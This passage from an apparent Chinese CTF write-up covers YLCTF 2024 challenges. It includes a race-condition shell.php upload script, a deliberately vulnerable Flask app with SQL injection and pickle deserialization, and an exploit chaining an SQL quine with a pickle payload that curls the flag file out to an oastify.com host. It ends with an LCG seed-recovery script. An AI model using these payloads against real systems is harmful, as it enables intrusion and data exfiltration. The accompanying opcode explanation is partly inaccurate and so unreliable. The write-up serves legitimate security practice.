class="hljs-string">&quot;http://challenge.yuanloo.com:27814/uploads/shell.php&quot;</span>).status_code != <span class="hljs-number">404</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>)<br>            exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>    t1 = threading.Thread(target=WRITE, args=(session,))<br>    t1.daemon = <span class="hljs-literal">True</span><br>    t1.start()<br><br>    READ(session)<br></code></pre></td></tr></table></figure><h5 id="round-2-snekly复现"><a class="markdownIt-Anchor" href="#round-2-snekly复现"></a> [Round 2] SNEKLY(复现)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, jsonify<br><span class="hljs-keyword">from</span> flask_login <span class="hljs-keyword">import</span> LoginManager, UserMixin<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;060ac533d307&#x27;</span><br>app.static_folder = <span class="hljs-string">&#x27;static&#x27;</span><br>login_manager = LoginManager()<br>login_manager.init_app(app)<br>login_manager.login_view = <span class="hljs-string">&#x27;login&#x27;</span><br><br>user = &#123;&#125;<br><br>current_dir = os.path.dirname(os.path.abspath(__file__))<br><br>db_path = os.path.join(current_dir, <span class="hljs-string">&#x27;data.db&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">UserMixin</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, username, password_hash, data</span>):<br>        <span class="hljs-variable language_">self</span>.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password_hash = password_hash<br>        <span class="hljs-variable language_">self</span>.data = data<br><br><br><span class="hljs-meta">@login_manager.user_loader</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_user</span>(<span class="hljs-params">user_id</span>):<br>    conn = sqlite3.connect(db_path)<br>    cursor = conn.cursor()<br>    cursor.execute(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>, (user_id,))<br>    user_data = cursor.fetchone()<br>    conn.close()<br><br>    <span class="hljs-keyword">if</span> user_data:<br>        <span class="hljs-keyword">return</span> User(<span class="hljs-built_in">id</span>=user_data[<span class="hljs-number">0</span>], username=user_data[<span class="hljs-number">1</span>], password_hash=user_data[<span class="hljs-number">2</span>], data=user_data[<span class="hljs-number">3</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">global</span> user<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户名或密码不能为空&quot;</span>&#125;)<br><br>        <span class="hljs-keyword">try</span>:<br>            con = sqlite3.connect(db_path)<br>            cur = con.cursor()<br><br>            output = cur.execute(<br>                <span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &#123;post[username]!r&#125; AND password = &#123;post[password]!r&#125;&#x27;</span><br>                .<span class="hljs-built_in">format</span>(post=request.form)<br>            ).fetchone()<br><br>            <span class="hljs-keyword">if</span> output <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户名或密码错误&quot;</span>&#125;)<br><br>            user[<span class="hljs-string">&#x27;id&#x27;</span>], user[<span class="hljs-string">&#x27;username&#x27;</span>], user[<span class="hljs-string">&#x27;password&#x27;</span>], user[<span class="hljs-string">&#x27;data&#x27;</span>] = output<br><br>            <span class="hljs-comment"># 使用安全的密码验证方法</span><br>            <span class="hljs-keyword">if</span> (user[<span class="hljs-string">&#x27;username&#x27;</span>] == username) <span class="hljs-keyword">and</span> (user[<span class="hljs-string">&#x27;password&#x27;</span>] == password):<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;登录成功&quot;</span>&#125;)<br>            <span class="hljs-keyword">else</span>:<br>                user = &#123;&#125;<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户名或密码错误&quot;</span>&#125;)<br>        <span class="hljs-keyword">except</span> sqlite3.Error <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;数据库错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;服务器错误，请稍后重试&quot;</span>&#125;)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;无效的请求方法&quot;</span>&#125;)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/unSer&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unSer</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = base64.b64decode(user[<span class="hljs-string">&#x27;data&#x27;</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(keyword <span class="hljs-keyword">in</span> data <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> [<span class="hljs-string">b&#x27;getattr&#x27;</span>, <span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;map&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;exec&#x27;</span>, <span class="hljs-string">b&#x27;import&#x27;</span>]):<br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;unSer&quot;</span>)<br>        pickle.loads(data)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;unSer&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure><p>看到有pickle的模块大抵应该是考察python的反序列化，定位一下关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">unSer</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = base64.b64decode(user[<span class="hljs-string">&#x27;data&#x27;</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(keyword <span class="hljs-keyword">in</span> data <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> [<span class="hljs-string">b&#x27;getattr&#x27;</span>, <span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;map&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;exec&#x27;</span>, <span class="hljs-string">b&#x27;import&#x27;</span>]):<br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;unSer&quot;</span>)<br>        pickle.loads(data)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;unSer&quot;</span><br></code></pre></td></tr></table></figure><p>使用bp打一个dnslog</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quine</span>(<span class="hljs-params">data</span>):<br>    data = data.replace(<span class="hljs-string">&#x27;$$&#x27;</span>, <span class="hljs-string">&quot;REPLACE(REPLACE(REPLACE($$,CHAR(39),CHAR(34)),CHAR(36),$$), CHAR(92), CHAR())&quot;</span>)<br>    data1 = data.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>).replace(<span class="hljs-string">&#x27;$$&#x27;</span>, <span class="hljs-string">&quot;&#x27;$&#x27;&quot;</span>)<br>    data = data.replace(<span class="hljs-string">&#x27;$$&#x27;</span>, <span class="hljs-string">f&#x27;&quot;<span class="hljs-subst">&#123;data1&#125;</span>&quot;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    username = <span class="hljs-string">&quot;test\&quot;&#x27;&quot;</span><br><br>    opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__builtin__</span><br><span class="hljs-string">filter</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0(S&#x27;curl http://`cat /f*`.urpybxuysw5jjp2ie3koqo4ia9g14rsg.oastify.com&#x27;</span><br><span class="hljs-string">tp1</span><br><span class="hljs-string">0(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">g1</span><br><span class="hljs-string">tp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">g2</span><br><span class="hljs-string">\x81p3</span><br><span class="hljs-string">0c__builtin__</span><br><span class="hljs-string">tuple</span><br><span class="hljs-string">p4</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">t\x81.&#x27;&#x27;&#x27;</span><br>    a = base64.b64encode(opcode).decode()<br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i) &gt; <span class="hljs-number">58</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i) &lt; <span class="hljs-number">47</span>:<br>            res += <span class="hljs-string">&quot;||CHAR(&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(i)) + <span class="hljs-string">&quot;)&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            res += <span class="hljs-string">&quot;||&quot;</span> + i<br>    res = res[<span class="hljs-number">2</span>:]<br><br>    password = <span class="hljs-string">f&quot; UNION SELECT $$, CHAR(<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;,&#x27;</span>.join(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(c)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> username)&#125;</span>), $$,(<span class="hljs-subst">&#123;res&#125;</span>);-- -&quot;</span><br>    password = quine(password)<br><br>    requests.post(url=<span class="hljs-string">&quot;http://challenge.yuanloo.com:29180/login&quot;</span>,<br>                  data=&#123;<br>                      <span class="hljs-string">&quot;username&quot;</span>: username,<br>                      <span class="hljs-string">&quot;password&quot;</span>: password<br>                  &#125;)<br><br>    requests.get(url=<span class="hljs-string">&quot;http://challenge.yuanloo.com:29180/unSer&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/SNEKLy.png" alt="SNEKLy"></p><p>学学opcode吧</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">开头的 c<span class="hljs-strong">__builtin__</span>：<br>c 表示这个数据结构是一个类的调用。<br><span class="hljs-strong">__builtin__</span> 是 Python 内置模块，意味着后续会调用该模块中的函数。<br>filter 是内置函数，用于过滤序列。它将在后续的调用中被使用。<br>p0 表示将后续的对象（0表示第一个对象）保存到位置 0。<br>0(S&#x27;curl http://... 是一个字符串对象，表示要执行的命令。<br>这里的命令使用反引号执行 cat /f<span class="hljs-emphasis">*，并将输出发送到指定的 URL。</span><br><span class="hljs-emphasis">tp1 是另一个指令，用于标记后续的数据结构类型。</span><br><span class="hljs-emphasis">0(cos 说明后续数据是与 cos 相关</span><br><span class="hljs-emphasis">system 是 os 模块中的一个函数，用于执行系统命令。</span><br><span class="hljs-emphasis">g1 用于获取在之前定义的对象，可能是一个函数的引用。</span><br><span class="hljs-emphasis">tp2 标记下一个数据结构的类型。</span><br><span class="hljs-emphasis">0g0 指获取第一个对象（即命令字符串）。</span><br><span class="hljs-emphasis">g2 表示下一个对象的获取。</span><br><span class="hljs-emphasis">\x81 是一个转义字符，用于处理特定的内部格式。</span><br><span class="hljs-emphasis">p3 表示将此对象保存到位置 3。</span><br><span class="hljs-emphasis">0c<span class="hljs-strong">__builtin__</span> 和 tuple：</span><br><span class="hljs-emphasis">这段是为了创建一个元组，包含前面定义的对象。</span><br><span class="hljs-emphasis">最终的结构是一个包含 system 函数和命令的元组。</span><br><span class="hljs-emphasis">p4 将这个元组保存在位置 4。</span><br><span class="hljs-emphasis">(g3 是标记获取之前保存的对象（即要执行的命令）。</span><br></code></pre></td></tr></table></figure><h3 id="round-3"><a class="markdownIt-Anchor" href="#round-3"></a> Round 3</h3><h4 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3"></a> crypto</h4><h5 id="round-3-ezlcg"><a class="markdownIt-Anchor" href="#round-3-ezlcg"></a> [Round 3] ezlcg</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse<br><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>, <span class="hljs-number">22178</span>)<br><br><span class="hljs-comment"># 跳过前27行</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>    p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_lcg_parameters</span>(<span class="hljs-params">states, N</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;求解LCG的参数a和b&quot;&quot;&quot;</span><br>    diffs = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(states) - <span class="hljs-number">1</span>):<br>        diffs.append((states[i + <span class="hljs-number">1</span>] - states[i]) % N)<br><br>    a_candidates = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(diffs) - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> diffs[i + <span class="hljs-number">1</span>] != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">try</span>:<br>                a = (diffs[i + <span class="hljs-number">1</span>] * inverse(diffs[i], N)) % N<br>                a_candidates.append(a)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a_candidates) &gt; <span class="hljs-number">0</span>:<br>        a = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">set</span>(a_candidates), key=a_candidates.count)<br>        b = (states[<span class="hljs-number">1</span>] - a * states[<span class="hljs-number">0</span>]) % N<br>        <span class="hljs-keyword">return</span> a, b<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_seed</span>(<span class="hljs-params">N, num1, num2, num3</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;从三个连续状态值找到初始种子&quot;&quot;&quot;</span><br>    states = [num1, num2, num3]<br><br>    <span class="hljs-comment"># 求解a和b</span><br>    a, b = solve_lcg_parameters(states, N)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> a <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> b:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 反推seed</span><br>    seed = ((num1 - b) * inverse(a, N)) % N<br><br>    <span class="hljs-comment"># 验证</span><br>    state = seed<br>    verified = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> expected <span class="hljs-keyword">in</span> [num1, num2, num3]:<br>        state = (state * a + b) % N<br>        <span class="hljs-keyword">if</span> state != expected:<br>            verified = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> seed, a, b <span class="hljs-keyword">if</span> verified <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    data = p.recvuntil(<span class="hljs-string">&quot;seed =&quot;</span>.encode()).decode()<br><br>    a_match = re.search(<span class="hljs-string">r&#x27;a=(\d+)&#x27;</span>, data)<br>    b_match = re.search(<span class="hljs-string">r&#x27;b=(\d+)&#x27;</span>, data)<br>    N_match = re.search(<span class="hljs-string">r&#x27;N=(\d+)&#x27;</span>, data)<br>    num1_match = re.search(<span class="hljs-string">r&#x27;num1=(\d+)&#x27;</span>, data)<br><br>    <span class="hljs-keyword">if</span> a_match <span class="hljs-keyword">and</span> b_match <span class="hljs-keyword">and</span> N_match <span class="hljs-keyword">and</span> num1_match:<br>        a = <span class="hljs-built_in">int</span>(a_match.group(<span class="hljs-number">1</span>))<br>        b = <span class="hljs-built_in">int</span>(b_match.group(<span class="hljs-number">1</span>))<br>        N = <span class="hljs-built_in">int</span>(N_match.group(<span class="hljs-number">1</span>))<br>        num1 = <span class="hljs-built_in">int</span>(num1_match.group(<span class="hljs-number">1</span>))<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_seed_a_b</span>(<span class="hljs-params">a, b, N, num1</span>):<br>            left_side = (num1 - b) % N<br>            a_inv = inverse(a, N)<br>            seed = (left_side * a_inv) % N<br>            <span class="hljs-keyword">return</span> seed<br><br>        seed = find_seed_a_b(a, b, N, num1)<br>        p.sendline(<span class="hljs-built_in">str</span>(seed))<br>        response = p.recvuntil(<span class="hljs-string">&quot;success!&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(response.decode())<br><br>response = p.recvuntil(<span class="hljs-string">&quot;Challenge two,30 Round&quot;</span>.encode())<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Challenge two,30 Round&quot;</span> <span class="hljs-keyword">in</span> response.decode():<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        data = p.recvuntil(<span class="hljs-string">&quot;seed =&quot;</span>.encode()).decode()<br><br>        a_match = re.search(<span class="hljs-string">r&#x27;a=(\d+)&#x27;</span>, data)<br>        N_match = re.search(<span class="hljs-string">r&#x27;N=(\d+)&#x27;</span>, data)<br>        num1_match = re.search(<span class="hljs-string">r&#x27;num1=(\d+)&#x27;</span>, data)<br>        num2_match = re.search(<span class="hljs-string">r&#x27;num2=(\d+)&#x27;</span>, data)<br><br>        <span class="hljs-keyword">if</span> a_match <span class="hljs-keyword">and</span> N_match <span class="hljs-keyword">and</span> num1_match <span class="hljs-keyword">and</span> num2_match:<br>            a = <span class="hljs-built_in">int</span>(a_match.group(<span class="hljs-number">1</span>))<br>            N = <span class="hljs-built_in">int</span>(N_match.group(<span class="hljs-number">1</span>))<br>            num1 = <span class="hljs-built_in">int</span>(num1_match.group(<span class="hljs-number">1</span>))<br>            num2 = <span class="hljs-built_in">int</span>(num2_match.group(<span class="hljs-number">1</span>))<br><br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">lcg_seed</span>(<span class="hljs-params">num1, num2, a, N</span>):<br>                b = (num2 - (a * num1) % N + N) % N<br>                seed = (num1 - b) * inverse(a, N) % N<br>                <span class="hljs-keyword">return</span> seed<br><br>            seed = lcg_seed(num1, num2, a, N)<br>            p.sendline(<span class="hljs-built_in">str</span>(seed))<br>            response = p.recvuntil(<span class="hljs-string">&quot;success!&quot;</span>.encode())<br>            <span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># Challenge three 部分</span><br>data = p.recvuntil(<span class="hljs-string">&quot;Challenge three,10 Round&quot;</span>.encode()).decode()<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Challenge three,10 Round&quot;</span> <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;进入 Challenge three, 10 Round&quot;</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        data = p.recvuntil(<span class="hljs-string">&quot;seed =&quot;</span>.encode()).decode()<br><br>        N_match = re.search(<span class="hljs-string">r&#x27;N=(\d+)&#x27;</span>, data)<br>        num1_match = re.search(<span 